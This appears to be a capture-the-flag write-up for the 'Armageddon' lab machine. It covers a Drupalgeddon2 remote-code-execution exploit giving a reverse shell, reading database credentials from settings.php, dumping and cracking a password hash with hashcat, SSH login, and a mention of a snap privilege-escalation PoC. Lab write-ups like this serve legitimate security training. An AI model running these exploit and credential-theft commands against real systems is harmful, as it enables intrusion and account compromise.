Armageddon

Enumeration

First, let's check for open ports.

sudo nmap -p- -sCV RHOST-IP --min-rate=2000 > ~/tempo/nmap.txt

There is no interesting information except HTTP. Since this output is basic, we start by browsing the website.

Foothold

Wappalyzer reveals the CMS used, which might have known vulnerabilities.

As expected, the CMS is vulnerable.

According to this PoC, Drupal 7 is vulnerable to RCE. Using this PoC, we can establish a reverse shell.

git clone https://github.com/dreadlocked/Drupalgeddon2.git
cd Drupalgeddon2
ruby drupalgeddon2.rb http://RHOST

After running the exploit, we successfully get a reverse shell.

Lateral Movement

We are limited to the `/var/www/html` directory and can't navigate elsewhere. Also, Python is unavailable, which complicates creating a stable shell.

Let's try directory enumeration to find something useful.

gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.48.89/ -t 70 > gobuster.txt

We discover a settings file that may contain credentials.

Using the reverse shell, we extract credentials from `settings.php`:

cat sites/default/settings.php | grep -E 'password|username'

With these credentials, we access MySQL and dump users table.

mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'

We get a hashed password, then crack it using Hashcat.

echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash
sudo hashcat -m 7900 -a 0 -o cracked.txt --potfile-disable hash /usr/share/wordlists/rockyou.txt

Now we can SSH as the discovered user:

sshpass -p 'booboo' ssh brucetherealadmin@10.129.48.89

Privilege Escalation

This user can run `snap install` as sudo. Let's check the version of Snap.

snap --version

We find that the Snap version is vulnerable. According to this PoC, the exploit creates a new user with sudo privileges.
